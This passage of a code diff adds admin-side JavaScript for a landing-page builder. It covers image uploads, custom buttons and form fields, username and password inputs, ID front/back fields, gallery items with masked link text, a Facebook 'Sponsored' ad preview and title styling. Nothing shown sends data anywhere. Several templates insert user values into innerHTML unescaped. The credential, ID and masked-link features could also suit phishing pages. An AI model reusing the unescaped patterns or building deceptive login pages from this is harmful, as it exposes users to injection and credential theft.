+    const img = document.getElementById("backPreview");
+    img.src = e.target.result;
+  };
+  reader.readAsDataURL(file);
+});
+    
+    function handleExtraButtonImage(input, index) {
+  const file = input.files[0];
+  if (!file) return;
+
+  const reader = new FileReader();
+
+  reader.onload = function (e) {
+    if (!extraButtons[index]) extraButtons[index] = {};
+    
+    extraButtons[index].image = e.target.result;
+
+    console.log("Image saved:", extraButtons[index].image);
+
+    renderPreview(); // 🔥 refresh preview
+  };
+
+  reader.readAsDataURL(file); // ✅ IMPORTANT
+}
+    
+    function addExtraButton() {
+
+  const text = document.getElementById("newBtnText")?.value.trim();
+  const link = document.getElementById("newBtnLink")?.value || "#";
+  const color = document.getElementById("newBtnColor")?.value || "#1976d2";
+  const size = parseInt(document.getElementById("newBtnSize")?.value) || 44;
+  const show = document.getElementById("newBtnShow")?.checked ?? true;
+  const align = document.getElementById("newBtnAlign")?.value || "center";
+  const desc = document.getElementById("newBtnDesc")?.value || "";
+
+  const fileInput = document.getElementById("newBtnImage");
+  const file = fileInput?.files[0];
+
+  const btn = {
+    id: "btn_" + Date.now(),
+    text,
+    link,
+    color,
+    size,
+    show,
+    align,
+    desc,
+    image: ""
+  };
+
+  // =========================
+  // 🖼 HANDLE IMAGE (FIX)
+  // =========================
+  if (file) {
+
+    const reader = new FileReader();
+
+    reader.onload = function (e) {
+
+      btn.image = e.target.result;
+
+      extraButtons.push(btn);
+
+      renderPreview();
+      renderExtraButtonsList();
+
+      fileInput.value = ""; // reset input
+    };
+
+    reader.readAsDataURL(file);
+
+  } else {
+
+    extraButtons.push(btn);
+
+    renderPreview();
+    renderExtraButtonsList();
+  }
+}
+
+function deleteExtraButton(index) {
+  extraButtons.splice(index, 1);
+  renderPreview();
+  renderExtraButtonsList();
+}
+
+function clearAllExtraButtons() {
+  extraButtons = [];
+  renderPreview();
+  renderExtraButtonsList();
+}
+
+// ✅ PASTE YOUR NEW FUNCTION HERE
+function renderExtraButtonsList() {
+  const container = document.getElementById("extraButtonsList");
+  if (!container) return;
+
+  container.innerHTML = "";
+
+  extraButtons.forEach((btn, index) => {
+    const row = document.createElement("div");
+
+    row.style.display = "flex";
+    row.style.justifyContent = "space-between";
+    row.style.alignItems = "center";
+    row.style.marginBottom = "8px";
+    row.style.padding = "6px";
+    row.style.border = "1px solid #ccc";
+    row.style.borderRadius = "6px";
+
+    row.innerHTML = `
+      <span>${btn.text}</span>
+      <button onclick="deleteExtraButton(${index})"
+        style="background:red;color:#fff;border:none;padding:5px 10px;border-radius:5px;cursor:pointer;">
+        ❌ Delete
+      </button>
+    `;
+
+    container.appendChild(row);
+  });
+}
+    
+    // -------------------------
+// GLOBAL DRAG MOVE HANDLER
+// -------------------------
+document.onmousemove = e => {
+  if (!dragging) return;
+
+  const preview = document.getElementById("Preview");
+  if (!preview) return;
+
+  const rect = preview.getBoundingClientRect();
+  dragging.x = ((e.clientX - rect.left - dx) / rect.width) * 100;
+  dragging.y = ((e.clientY - rect.top - dy) / rect.height) * 100;
+
+  renderPreview();
+};
+
+document.onmouseup = () => dragging = null;
+
+// -------------------------
+// CUSTOM FORM FIELDS (ADMIN UI)
+// -------------------------
+function renderCustomFields() {
+  const wrap = $("customFieldsWrap");
+  if (!wrap) return;
+
+  wrap.innerHTML = "";
+
+  customFields.forEach((fld, i) => {
+    const div = document.createElement("div");
+    div.style.border = "1px solid #ccc";
+    div.style.padding = "10px";
+    div.style.marginTop = "8px";
+    div.style.borderRadius = "8px";
+    div.style.background = "#fafafa";
+
+    div.innerHTML = `
+      <label>Field Label</label>
+      <input value="${fld.label}"
+        oninput="customFields[${i}].label=this.value; renderPreview()">
+
+      <label>Type</label>
+      <select onchange="customFields[${i}].type=this.value; renderPreview()">
+        <option value="text" ${fld.type==="text"?"selected":""}>Text</option>
+        <option value="number" ${fld.type==="number"?"selected":""}>Number</option>
+        <option value="email" ${fld.type==="email"?"selected":""}>Email</option>
+        <option value="password" ${fld.type==="password"?"selected":""}>Password</option>
+      </select>
+
+      <button
+        style="margin-top:8px;background:#c62828;color:#fff;border:none;
+               padding:6px 10px;border-radius:6px;cursor:pointer"
+        onclick="deleteCustomField(${i})">
+        ❌ Delete This Field
+      </button>
+    `;
+
+    wrap.appendChild(div);
+  });
+}
+
+function addCustomField() {
+  customFields.push({ label: "New Field", type: "text" });
+  renderCustomFields();
+  renderPreview();
+}
+
+function deleteCustomField(index) {
+  customFields.splice(index, 1);
+  renderCustomFields();
+  renderPreview();
+}
+
+function clearCustomFields() {
+  customFields = [];
+  renderCustomFields();
+  renderPreview();
+}
+
+// -------------------------
+// Update SEO & OG Meta Tags
+// -------------------------
+function updateSEOMeta() {
+  // Page Title
+  document.title = $("seoTitle").value;
+
+  // Meta Description
+  let metaDesc = document.querySelector('meta[name="description"]');
+  if (!metaDesc) {
+    metaDesc = document.createElement("meta");
+    metaDesc.name = "description";
+    document.head.appendChild(metaDesc);
+  }
+  metaDesc.content = $("metaDesc").value;
+
+  // OG Image
+  let ogImage = document.querySelector('meta[property="og:image"]');
+  if (!ogImage) {
+    ogImage = document.createElement("meta");
+    ogImage.setAttribute("property", "og:image");
+    document.head.appendChild(ogImage);
+  }
+  ogImage.content = $("ogImage").value;
+
+  // OG Title
+  let ogTitle = document.querySelector('meta[property="og:title"]');
+  if (!ogTitle) {
+    ogTitle = document.createElement("meta");
+    ogTitle.setAttribute("property", "og:title");
+    document.head.appendChild(ogTitle);
+  }
+  ogTitle.content = $("seoTitle").value;
+
+  // OG Description
+  let ogDesc = document.querySelector('meta[property="og:description"]');
+  if (!ogDesc) {
+    ogDesc = document.createElement("meta");
+    ogDesc.setAttribute("property", "og:description");
+    document.head.appendChild(ogDesc);
+  }
+  ogDesc.content = $("metaDesc").value;
+}
+
+// Default example gallery items
+let galleryItems = [
+  {
+    img: "https://picsum.photos/400/250",
+    link: "https://example.com",
+    mask: "Visit Website",
+    desc: "Example gallery item description"
+  },
+  {
+    img: "https://picsum.photos/401/250",
+    link: "https://google.com",
+    mask: "Open Google",
+    desc: "Second example item"
+  }
+];
+
+function addGalleryItem() {
+  galleryItems.push({
+    img: "https://picsum.photos/402/250",
+    link: "https://example.com",
+    mask: "Learn More",
+    desc: "New gallery item"
+  });
+  renderGalleryInputs();
+  renderPreview();
+}
+
+function deleteGalleryItem(index) {
+  if (!confirm("Delete this gallery item?")) return;
+  galleryItems.splice(index, 1);
+  renderGalleryInputs();
+  renderPreview();
+}
+
+function clearGalleryItems() {
+  if (!confirm("Clear ALL gallery items? This cannot be undone.")) return;
+  galleryItems = [];
+  renderGalleryInputs();
+  renderPreview();
+}
+
+function renderGalleryInputs() {
+  const wrap = $("galleryItemsWrap");
+  if (!wrap) return;
+
+  wrap.innerHTML = "";
+
+  galleryItems.forEach((item, i) => {
+    const div = document.createElement("div");
+    div.style.border = "1px solid #ccc";
+    div.style.padding = "10px";
+    div.style.marginTop = "8px";
+    div.style.borderRadius = "8px";
+    div.style.background = "#fafafa";
+
+    div.innerHTML = `
+      <label>Image URL</label>
+      <input value="${item.img}"
+        oninput="galleryItems[${i}].img=this.value; renderPreview()">
+
+      <label>Masked Text</label>
+      <input value="${item.mask}"
+        oninput="galleryItems[${i}].mask=this.value; renderPreview()">
+
+      <label>Link URL</label>
+      <input value="${item.link}"
+        oninput="galleryItems[${i}].link=this.value; renderPreview()">
+
+      <label>Description</label>
+      <textarea
+        oninput="galleryItems[${i}].desc=this.value; renderPreview()"
+      >${item.desc || ""}</textarea>
+
+      <button
+        style="margin-top:8px;background:#c62828;color:#fff;border:none;
+               padding:6px 10px;border-radius:6px;cursor:pointer"
+        onclick="deleteGalleryItem(${i})">
+        ❌ Delete Gallery Item
+      </button>
+    `;
+
+    wrap.appendChild(div);
+  });
+}
+
+function addLine() {
+  const presetKey = $("linePreset")?.value;
+  const presetText = linePresets[presetKey] || "────────";
+
+  draggableItems.push({
+    id: "l" + Math.random().toString(36).slice(2),
+    text: presetText,
+    color: $("lineColor")?.value || "#000",
+    size: parseInt($("lineSize")?.value) || 2,
+    x: 50,
+    y: 50,
+    align: "center",
+    show: true
+  });
+
+  renderLinesList();   // ✅ REQUIRED
+  renderPreview();
+}
+
+/* =========================
+   Lines Admin List
+========================= */
+function renderLinesList() {
+  const wrap = $("linesList");
+  if (!wrap) return;
+
+  wrap.innerHTML = "";
+
+  draggableItems.forEach((line, i) => {
+    if (!line.text) return;
+
+    const row = document.createElement("div");
+    row.style.border = "1px solid #ddd";
+    row.style.padding = "8px";
+    row.style.marginTop = "8px";
+    row.style.borderRadius = "8px";
+    row.style.background = "#fafafa";
+
+    row.innerHTML = `
+      <strong>Line ${i + 1}</strong>
+
+      <label style="margin-top:6px;display:block">Alignment</label>
+      <select onchange="draggableItems[${i}].align=this.value; renderPreview()">
+        <option value="left" ${line.align==="left"?"selected":""}>Left</option>
+        <option value="center" ${line.align==="center"?"selected":""}>Center</option>
+        <option value="right" ${line.align==="right"?"selected":""}>Right</option>
+      </select>
+
+      <button
+        style="margin-top:6px;background:#c62828;color:#fff;border:none;
+               padding:6px 10px;border-radius:6px;cursor:pointer"
+        onclick="draggableItems.splice(${i},1); renderLinesList(); renderPreview()">
+        ❌ Delete Line
+      </button>
+    `;
+
+    wrap.appendChild(row);
+  });
+}
+
+/* ==========================================
+   FACEBOOK LIVE PREVIEW ENGINE
+========================================== */
+
+function renderFacebookPreview() {
+
+  const name = $("fbName")?.value || "John Doe";
+  const primary = $("fbPrimaryText")?.value || "";
+  const headline = $("fbHeadline")?.value || "";
+  const desc = $("fbDescription")?.value || "";
+  const cta = $("fbCTA")?.value || "Learn More";
+
+  const bgColor = $("fbAdBgColor")?.value || "#fff";
+  const textColor = $("fbAdTextColor")?.value || "#000";
+
+  const showSponsored = $("fbSponsoredTag")?.checked;
+  const showCTA = $("fbShowCTAButton")?.checked;
+  const badge = $("fbCustomBadge")?.value;
+
+  const container = document.createElement("div");
+  container.className = "fb-card-animate";
+
+  container.style.background = bgColor;
+  container.style.color = textColor;
+  container.style.borderRadius = "12px";
+  container.style.boxShadow = "0 4px 15px rgba(0,0,0,.15)";
+  container.style.margin = "20px 0";
+  container.style.fontFamily = "Arial, sans-serif";
+  container.style.overflow = "hidden";
+
+  container.innerHTML = `
+
+    <div style="padding:15px">
+
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
+        <img src="https://via.placeholder.com/40" 
+             style="width:40px;height:40px;border-radius:50%">
+        <div>
+          <strong>${name}</strong>
+          ${showSponsored ? "<br><small style='opacity:.6'>Sponsored</small>" : ""}
+        </div>
+      </div>
+
+      <p style="margin-bottom:10px">${primary}</p>
+
+      <div style="
+          border:1px solid #ddd;
+          border-radius:10px;
+          overflow:hidden;
+          background:#f9f9f9;
+      ">
+
+        <img src="https://picsum.photos/600/300" 
+             style="width:100%;height:200px;object-fit:cover">
+
+        <div style="padding:12px">
+
+          ${badge ? `
+            <div style="
+              display:inline-block;
+              background:#e53935;
+              color:#fff;
+              padding:4px 8px;
+              font-size:12px;
+              border-radius:20px;
+              margin-bottom:6px;
+            ">${badge}</div>
+          ` : ""}
+
+          <strong style="display:block;margin-bottom:4px">
+            ${headline}
+          </strong>
+
+          <small style="opacity:.7">${desc}</small>
+
+          ${showCTA ? `
+            <div style="margin-top:10px">
+              <button style="
+                background:#1877f2;
+                color:#fff;
+                border:none;
+                padding:8px 16px;
+                border-radius:6px;
+                cursor:pointer;
+                font-weight:600;
+              ">
+                ${cta}
+              </button>
+            </div>
+          ` : ""}
+
+        </div>
+
+      </div>
+
+    </div>
+  `;
+
+  return container;
+}
+
+function applyTitleStyle(style, el) {
+
+  switch(style) {
+
+    /* BASIC */
+    case "style1": el.style.textDecoration = "underline"; break;
+    case "style2": el.style.fontWeight = "900"; break;
+    case "style3": el.style.fontStyle = "italic"; break;
+    case "style4": el.style.textTransform = "uppercase"; break;
+    case "style5": el.style.letterSpacing = "4px"; break;
+
+    /* SHADOWS */
+    case "style6": el.style.textShadow = "2px 2px 6px rgba(0,0,0,.3)"; break;
+    case "style7": el.style.textShadow = "4px 4px 12px rgba(0,0,0,.6)"; break;
+    case "style8": el.style.textShadow = "0 0 15px #00f"; break;
+    case "style9": el.style.textShadow = "0 0 15px #ff00ff"; break;
+    case "style10": el.style.textShadow = "0 0 15px #00ff00"; break;
+
+    /* LUXURY METAL */
+    case "style11":
+      el.classList.add("gradient-text");
+      el.style.background = "linear-gradient(45deg,#d4af37,#fff5b7)";
+      break;
+
+    case "style12":
+      el.classList.add("gradient-text");
+      el.style.background = "linear-gradient(45deg,#c0c0c0,#f8f8f8)";
+      break;
+
+    case "style13":
+      el.classList.add("gradient-text");
+      el.style.background = "linear-gradient(45deg,#b76e79,#ffd1dc)";
+      break;
+
+    case "style14":
+      el.classList.add("gradient-text");
+      el.style.background = "linear-gradient(45deg,#e5e4e2,#ffffff)";
+      break;
+
+    case "style15":
+      el.classList.add("gradient-text");
+      el.style.background = "linear-gradient(45deg,#aaa,#fff,#888)";
+      break;
+
+    /* GLASS */
+    case "style16":
+      el.style.background = "rgba(255,255,255,.2)";
+      el.style.backdropFilter = "blur(5px)";
+      el.style.padding = "8px 16px";
+      break;
+
+    case "style17":
+      el.style.background = "rgba(255,255,255,.1)";
+      el.style.backdropFilter = "blur(12px)";
+      el.style.padding = "8px 16px";
+      break;
+
+    case "style18":
+      el.style.color = "transparent";
+      el.style.webkitTextStroke = "1px #000";
+      break;
+
+    case "style19":
+      el.style.border = "2px solid currentColor";
+      el.style.padding = "6px 14px";
+      break;
+
+    case "style20":
+      el.style.border = "2px solid currentColor";
+      el.style.padding = "6px 20px";
+      el.style.borderRadius = "50px";
+      break;
+
+    /* GRADIENTS */
+    case "style21":
+      el.classList.add("gradient-text");
+      el.style.background = "linear-gradient(45deg,#2193b0,#6dd5ed)";
+      break;
+
+    case "style22":
+      el.classList.add("gradient-text");
+      el.style.background = "linear-gradient(45deg,#ff0000,#ff9800)";
+      break;
+
+    case "style23":
+      el.classList.add("gradient-text");
+      el.style.background = "linear-gradient(45deg,#ff512f,#dd2476)";
+      break;
+
+    case "style24":
+      el.classList.add("gradient-text");
+      el.style.background = "linear-gradient(45deg,#6a11cb,#2575fc)";
+      break;
+
+    case "style25":
+      el.classList.add("gradient-text");
+      el.style.background = "linear-gradient(45deg,#00f5ff,#ff00c8)";
+      break;
+
+    /* 3D */
+    case "style26":
+      el.style.textShadow = "3px 3px 0 #000";
+      break;
+
+    case "style27":
+      el.style.textShadow = "2px 2px 0 #000,4px 4px 0 #555";
+      break;
+
+    case "style28":
+      el.style.textShadow = "inset 2px 2px 4px #000";
+      break;
+
+    case "style29":
+      el.style.textShadow = "-2px -2px 4px #000";
+      break;
+
+    case "style30":
+      el.style.webkitTextStroke = "2px #000";
+      break;
+
+    /* SPECIAL */
+    case "style36":
+      el.style.textShadow = "0 0 10px #ff00ff";
+      el.style.color = "#ff00ff";
+      break;
+
+    case "style37":
+      el.style.color = "#00ff00";
+      el.style.textShadow = "0 0 10px #00ff00";
+      break;
+
+    case "style38":
+      el.style.color = "#00ff00";
+      el.style.textShadow = "0 0 20px #00ff00";
+      break;
+
+    case "style39":
+      el.style.textShadow = "3px 3px 0 #ff0080";
+      el.style.color = "#00eaff";
+      break;
+
+    case "style40":
+      el.classList.add("gradient-text");
+      el.style.background = "linear-gradient(45deg,#ff71ce,#01cdfe)";
+      break;
+
+    /* ANIMATIONS */
+    case "style91":
+      el.style.animation = "glowPulse 2s infinite";
+      break;
+
+    case "style92":
+      el.style.animation = "flashBlink 1s infinite";
+      break;
+
+    case "style93":
+      el.style.animation = "waveMove 1.5s infinite";
+      break;
+
+    case "style94":
+      el.style.animation = "flashBlink .3s infinite";
+      break;
+
+    case "style95":
+      el.style.animation = "glowPulse 1s infinite";
+      break;
+
+    /* ULTIMATE */
+    case "style100":
+      el.classList.add("gradient-text");
+      el.style.background = "linear-gradient(45deg,#ffd700,#ff00ff,#00f)";
+      el.style.textShadow = "0 0 20px #fff";
+      el.style.animation = "glowPulse 2s infinite";
+      break;
+
+  }
+}
+
+
+document.addEventListener("DOMContentLoaded", function () {
+
+  // ===============================
+  // 🆔 ID FIELD LIVE PREVIEW
+  // ===============================
+  $("idFrontSmallTitle")?.addEventListener("input", renderPreview);
+  $("idBackSmallTitle")?.addEventListener("input", renderPreview);
+
+  $("idFrontDesc")?.addEventListener("input", renderPreview);
+  $("idBackDesc")?.addEventListener("input", renderPreview);
+
+  $("idFrontType")?.addEventListener("change", renderPreview);
+  $("idBackType")?.addEventListener("change", renderPreview);
+
+  $("chkIdFront")?.addEventListener("change", renderPreview);
+  $("chkIdBack")?.addEventListener("change", renderPreview);
+
+  /* ===============================
+   TITLE LIVE PREVIEW CONTROLLER
+================================ */
+
+function updateTitlePreview() {
+
+  const preview = $("titlePreview");
+  if (!preview) return;
+
+  const text = $("title").value;
+  const color = $("titleColor").value;
+  const position = $("titlePosition").value;
+  const animation = $("titleAnimation").value;
+
+  const size = $("titleSize")?.value || 28;
+  const width = $("titleWidth")?.value || 70;
+  const height = $("titleHeight")?.value || 1.3;
+  const spacing = $("titleSpacing")?.value || 0;
+  const shadowX = $("shadowX")?.value || 0;
+  const shadowY = $("shadowY")?.value || 0;
+  const shadowBlur = $("shadowBlur")?.value || 0;
+
+  const speed = $("animationSpeed")?.value || 1;
+  const delay = $("animationDelay")?.value || 0;
+  const infinite = $("animationInfinite")?.checked;
+
+  // Reset everything first
+  preview.className = "";
+  preview.style = "";
+
+  // Basic text
+  preview.textContent = text;
+  preview.style.color = color;
+  preview.style.textAlign = position;
+  preview.style.fontSize = size + "px";
+  preview.style.width = width + "%";
+  preview.style.lineHeight = height;
+  preview.style.letterSpacing = spacing + "px";
+  preview.style.margin = "10px auto";
+  preview.style.textShadow =
+    shadowX + "px " + shadowY + "px " + shadowBlur + "px rgba(0,0,0,0.4)";
+
+  /* ======================
+     EXTRA TITLE STYLES
+  ====================== */
+
+  const selectedStyles = Array.from(
+    $("titleStyleSelect").selectedOptions
+  ).map(o => o.value);
+
+  selectedStyles.forEach(style => {
+    preview.classList.add(style);
+  });
+
+  /* ======================
+     ANIMATION
+  ====================== */
+
+  if (animation !== "none") {
+
+    preview.style.animationName = animation;
+    preview.style.animationDuration = speed + "s";
+    preview.style.animationDelay = delay + "s";
+    preview.style.animationIterationCount = infinite ? "infinite" : "1";
+    preview.style.animationFillMode = "both";
+  }
+}
+
+function handleImageUpload(fileInputId, targetInputId) {
+  const fileInput = document.getElementById(fileInputId);
+  if (!fileInput) return;
+
+  fileInput.addEventListener("change", function () {
+    const file = this.files[0];
+    if (!file) return;
+
+    const reader = new FileReader();
+    reader.onload = function (e) {
+      document.getElementById(targetInputId).value = e.target.result;
+      renderPreview();
+    };
+    reader.readAsDataURL(file);
+  });
+}
+
+// ==========================
+// AUTO LISTENERS
+// ==========================
+
+document.querySelectorAll(
+  "#title, #titleColor, #titlePosition, #titleStyleSelect, #titleAnimation, #titleSize, #titleWidth, #titleHeight, #titleSpacing, #shadowX, #shadowY, #shadowBlur, #animationSpeed, #animationDelay, #animationInfinite"
+).forEach(el => {
+  if (el) {
+    el.addEventListener("input", updateTitlePreview);
+    el.addEventListener("change", updateTitlePreview);
+  }
+});
+
+// ==========================
+// PREVIEW LISTENERS
+// ==========================
+
+document.querySelectorAll(
+  "#subtitle, #subtitleColor, #description, #avatarURL, #logoURL, #bannerURL, #bgImageURL"
+).forEach(el => {
+  if (el) {
+    el.addEventListener("input", renderPreview);
+    el.addEventListener("change", renderPreview);
+  }
+});
+
+[
+  "enableWarning",
+  "warning",
+  "warningColor",
+  "warningPosition"
+].forEach(id => {
+  $(id)?.addEventListener("input", renderPreview);
+  $(id)?.addEventListener("change", renderPreview);
+});
+
+$("formTitleInput")?.addEventListener("input", renderPreview);
+$("formTitlePosition")?.addEventListener("change", renderPreview);
+$("formTitleColor")?.addEventListener("input", renderPreview);
+
+// Run once
+updateTitlePreview();
+
+/* =========================
+   Render Preview
+========================= */
+function renderPreview() {
+  try {
+    const p = document.getElementById("preview");
+    if (!p) return;
+
+    p.innerHTML = "";
+    p.style.position = "relative";
+
+    /* -------------------------
+       Main container
+    ------------------------- */
+    const c = document.createElement("div");
+    c.style.position = "relative";
+    c.style.zIndex = 1;
+    c.style.width = "100%";
+    c.style.padding = "16px";
+    c.style.color = $("textColor").value || "#222";
+    c.style.backgroundColor = $("bgColor").value || "#fff";
+    if ($("bgImageURL").value) {
+    c.style.backgroundImage = `url(${$("bgImageURL").value})`;
+    c.style.backgroundSize = $("bgSize").value;
+    c.style.backgroundRepeat = "no-repeat";
+    c.style.backgroundPosition = "center";
+}
+
+    /* Avatar / Logo / Banner */
+    const addImage = (id, width, round = false, margin = "auto") => {
+      const url = $(id).value;
+      if (!url) return;
+      const img = document.createElement("img");
+      img.src = url;
+      img.style.width = width;
+      if (round) img.style.borderRadius = "50%";
+      img.style.display = "block";
+      img.style.margin = margin;
+      c.appendChild(img);
+    };
+    addImage("avatarURL", "90px", true);
+    addImage("logoURL", "140px");
+    addImage("bannerURL", "100%", false, "10px auto");
+
+    /* Title / Subtitle / Description */
+    const titleEl = document.createElement("h2");
+titleEl.textContent = $("title").value;
+titleEl.style.textAlign = $("titlePosition")?.value || "center";
+titleEl.style.color = $("titleColor").value || "#000";
+
+// ===============================
+// Title Extra Styles (NEW ENGINE)
+// ===============================
+const multiSelect = document.getElementById("titleStyleSelect");
+
+if (multiSelect) {
+
+  const selected = Array.from(multiSelect.selectedOptions).map(o => o.value);
+
+  selected.forEach(style => {
+    applyTitleStyle(style, titleEl);
+  });
+
+}
+
+const animation = $("titleAnimation")?.value || "none";
+const speed = $("animationSpeed")?.value || 1;
+const delay = $("animationDelay")?.value || 0;
+const infinite = $("animationInfinite")?.checked;
+
+if (animation !== "none") {
+  titleEl.style.animation = `
+    ${animation} ${speed}s ease ${delay}s 
+    ${infinite ? "infinite" : ""}
+  `;
+}
+
+c.appendChild(titleEl);
+
+/* Subtitle */
+const subtitleText = $("subtitle")?.value;
+if (subtitleText) {
+  const subEl = document.createElement("h4");
+  subEl.textContent = subtitleText;
+  subEl.style.textAlign = $("titlePosition")?.value || "center";
+  subEl.style.color = $("subtitleColor")?.value || "#666";
+  subEl.style.marginTop = "8px";
+  c.appendChild(subEl);
+}
+
+/* Description */
+const descText = $("description")?.value;
+if (descText) {
+  const descEl = document.createElement("p");
+  descEl.textContent = descText;
+  descEl.style.marginTop = "12px";
+  descEl.style.lineHeight = "1.6";
+  descEl.style.textAlign = "center";
+  c.appendChild(descEl);
+}
+
+/* ======================
+   WARNING SECTION
+====================== */
+
+const enableWarning = $("enableWarning")?.checked;
+const warningText = $("warning")?.value;
+const warningColor = $("warningColor")?.value || "red";
+
+if (enableWarning && warningText) {
+  const warningEl = document.createElement("div");
+  warningEl.textContent = warningText;
+
+  warningEl.style.background = "rgba(255,0,0,0.08)";
+  warningEl.style.color = warningColor;
+  warningEl.style.padding = "12px";
+  warningEl.style.marginTop = "15px";
+  warningEl.style.borderRadius = "8px";
+  warningEl.style.fontWeight = "600";
+  warningEl.style.textAlign = "center";
+  warningEl.style.border = "1px solid " + warningColor;
+
+  c.appendChild(warningEl);
+}
+
+    /* Forms */
+const fDiv = document.createElement("div");
+fDiv.style.display = "flex";
+fDiv.style.flexDirection = "column";
+fDiv.style.gap = "8px";
+
+let hasFields = false;
+
+/* =====================
+   AUTH FIELDS
+===================== */
+if ($("addAuth").checked) {
+  hasFields = true;
+
+  const inputBg = $("inputBgColor")?.value || "#fff";
+  const inputText = $("inputTextColor")?.value || "#000";
+  const inputBorder = $("inputBorderColor")?.value || "#ccc";
+  let padding = "10px"; // default
+
+  if (inputSize === "sm") padding = "6px";
+  else if (inputSize === "md") padding = "10px";
+  else if (inputSize === "lg") padding = "14px";
+  const inputShape = $("inputShape")?.value || "rounded";
+
+  // Size
+  let radius = "6px";
+  
+  const customRadius = $("customRadius")?.value;
+if (customRadius) radius = customRadius + "px";
+
+if (inputShape === "square") radius = "0px";
+else if (inputShape === "rounded") radius = "6px";
+else if (inputShape === "pill") radius = "30px";
+else if (inputShape === "soft") radius = "12px";
+else if (inputShape === "sharp") radius = "2px";
+else if (inputShape === "bubble") radius = "20px";
+
+  // Username
+  fDiv.innerHTML += `
+    <input 
+      placeholder="${$("usernamePlaceholder").value}"
+      style="
+        width:100%;
+        padding:${padding};
+        border:1px solid ${inputBorder};
+        border-radius:${radius};
+        background:${inputBg};
+        color:${inputText};
+        margin-top:10px;
+      ">
+  `;
+
+  // Password (WITH EYE TOGGLE)
+fDiv.innerHTML += `
+  <div style="position:relative;margin-top:10px;">
+    
+    <input 
+      type="password"
+      class="passwordField"
+      placeholder="${$("passwordPlaceholder").value}"
+      style="
+        width:100%;
+        padding:${padding};
+        border:1px solid ${inputBorder};
+        border-radius:${radius};
+        background:${inputBg};
+        color:${inputText};
+        padding-right:${
+          $("enablePasswordToggle")?.checked && $("eyeIconStyle")?.value !== "none"
+            ? "40px"
+            : padding
+        };
+      "
+    >
+
+    ${
+      $("enablePasswordToggle")?.checked && $("eyeIconStyle")?.value !== "none"
+        ? `<span onclick="togglePassword(this)"
+            class="eyeIcon"
+            style="
+              position:absolute;
+              right:10px;
+              top:50%;
+              transform:translateY(-50%);
+              cursor:pointer;
+            ">
+            ${getEyeIcon("closed", $("eyeIconStyle")?.value)}
+          </span>`
+        : ""
+    }
+
+  </div>
+`;
+}
+
+/* =====================
+   EXTRA TEXTAREA FIELDS
+===================== */
+$("extraFields").value
+  .split("\n")
+  .filter(Boolean)
+  .forEach(f => {
+    hasFields = true;
+    fDiv.innerHTML += `<input placeholder="${f}">`;
+  });
+
+/* =====================
+   CUSTOM FIELDS
+===================== */
+customFields.forEach(fld => {
+  hasFields = true;
+
+  const input = document.createElement("input");
+  input.type = fld.type;
+  input.placeholder = fld.label;
+  fDiv.appendChild(input);
+});
+
+/* =====================
+   ONLY APPEND IF NOT EMPTY
+===================== */
+if (hasFields) {
+  c.appendChild(fDiv);
+}
+
+    /* Gallery Images */
+    const galleryImages = $("galleryImages").value.split(",").map(i=>i.trim()).filter(Boolean);
+    if (galleryImages.length) {
+      const galleryDiv = document.createElement("div");
+      const layout = $("galleryLayout").value;
+      galleryDiv.style.display = layout === "grid" ? "grid" : "flex";
+      if (layout === "grid") galleryDiv.style.gridTemplateColumns = "repeat(auto-fit, minmax(120px,1fr))";
+      galleryDiv.style.flexWrap = "wrap";
+      galleryDiv.style.gap = "10px";
+      galleryDiv.style.margin = "12px 0";
+
+      galleryImages.forEach(url => {
+        const img = document.createElement("img");
+        img.src = url;
+        img.style.width = "120px";
+        img.style.borderRadius = "6px";
+        img.style.objectFit = "cover";
+        galleryDiv.appendChild(img);
+      });
+
+      c.appendChild(galleryDiv);
+    }
+
+    /* Warning */
+    if ($("enableWarning").checked && $("warningPosition").value !== "none") {
+      const warn = document.createElement("p");
+      warn.style.color = $("warningColor")?.value || "#b71c1c";
+      warn.style.textAlign = $("warningPosition").value;
+      warn.textContent = $("warning").value;
+      c.appendChild(warn);
+    }
+
+ /* =========================
+   Gallery Items (Layout aware)
+========================= */
+if (galleryItems?.length) {
+  const container = document.createElement("div");
+  const layout = $("galleryItemsLayout").value || "list";
+
+  container.style.gap = "12px";
+  container.style.margin = "14px 0";
+
+  // Reset styles when switching layouts
+  container.style.display = "";
+  container.style.gridTemplateColumns = "";
+
+  if (layout === "list") {
+    container.style.display = "flex";
+    container.style.flexDirection = "column";
+  }
+
+  if (layout === "grid") {
+    container.style.display = "grid";
+    container.style.gridTemplateColumns = "repeat(auto-fit, minmax(120px, 1fr))";
+  }
+
+  if (layout === "large-grid") {
+    container.style.display = "grid";
+    container.style.gridTemplateColumns = "repeat(auto-fit, minmax(220px, 1fr))";
+  }
+
+  if (layout === "mix") {
+    container.style.display = "grid";
+    container.style.gridTemplateColumns = "repeat(auto-fit, minmax(160px, 1fr))";
+  }
+
+  galleryItems.forEach((item, i) => {
+  const w = document.createElement("div");
+  w.style.border = "1px solid #ddd";
+  w.style.borderRadius = "8px";
+  w.style.padding = "8px";
+  w.style.background = "#fff";
+
+  // MIX layout: alternate big / small
+  if (layout === "mix" && i % 3 === 0 && window.innerWidth > 600) {
+    w.style.gridColumn = "span 2";
+  }
+
+  /* Image */
+  const img = document.createElement("img");
+  img.src = item.img;
+  img.style.width = "100%";
+  img.style.borderRadius = "6px";
+  w.appendChild(img);
+
+  /* 🔗 MASKED LINK (FIXED) */
+  if (item.link && item.mask) {
+    const a = document.createElement("a");
+    a.href = item.link;
+    a.textContent = item.mask;
+    a.target = "_blank";
+    a.style.display = "block";
+    a.style.margin = "6px 0";
+    a.style.color = "#1976d2";
+    a.style.fontWeight = "600";
+    a.style.textDecoration = "none";
+
+    w.appendChild(a);
+  }
+
+  /* Description */
+  if (item.desc) {
+    const p = document.createElement("p");
+    p.textContent = item.desc;
+    p.style.fontSize = "14px";
+    p.style.opacity = "0.85";
+    w.appendChild(p);
+  }
+
+  container.appendChild(w);
+});
+
+  c.appendChild(container);
+}
+    /* Videos */
+    $("videoLinks").value.split(",").map(v=>v.trim()).filter(Boolean).forEach(link=>{
+      let el;
+      if (link.endsWith(".mp4") || link.endsWith(".webm")) {
+        el=document.createElement("video");
+        el.src=link; el.controls=true;
+      } else if (link.includes("youtu")) {
+        let id=link.split("v=")[1]||link.split("youtu.be/")[1];
+        if(id?.includes("&")) id=id.split("&")[0];
+        if(id){
+          el=document.createElement("iframe");
+          el.src=`https://www.youtube.com/embed/${id}`;
+          el.width="100%"; el.height="315";
+          el.allowFullscreen=true;
+        }
+      }
+      if(el){ el.style.margin="6px 0"; c.appendChild(el); }
+    });
+    
+    /* -------------------------
+   Embed Links Preview
+------------------------- */
